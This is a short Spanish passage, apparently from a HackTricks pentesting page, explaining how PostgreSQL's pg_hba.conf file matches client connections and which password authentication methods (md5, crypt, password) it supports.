string pgadmin4.db
```
### pg_hba

La autenticación del cliente en PostgreSQL se gestiona a través de un archivo de configuración llamado **pg_hba.conf**. Este archivo contiene una serie de registros, cada uno especificando un tipo de conexión, rango de direcciones IP del cliente (si corresponde), nombre de la base de datos, nombre de usuario y el método de autenticación a utilizar para las conexiones coincidentes. El primer registro que coincide con el tipo de conexión, dirección del cliente, base de datos solicitada y nombre de usuario se utiliza para la autenticación. No hay un respaldo o alternativa si la autenticación falla. Si no coincide ningún registro, se deniega el acceso.

Los métodos de autenticación basados en contraseña disponibles en pg_hba.conf son **md5**, **crypt** y **password**. Estos métodos difieren en cómo se transmite la contraseña: con hash MD5, cifrado crypt o en texto claro. Es importante tener en cuenta que el método crypt no se puede utilizar con contraseñas que han sido cifradas en pg_authid.

{{#include ../banners/hacktricks-training.md}}
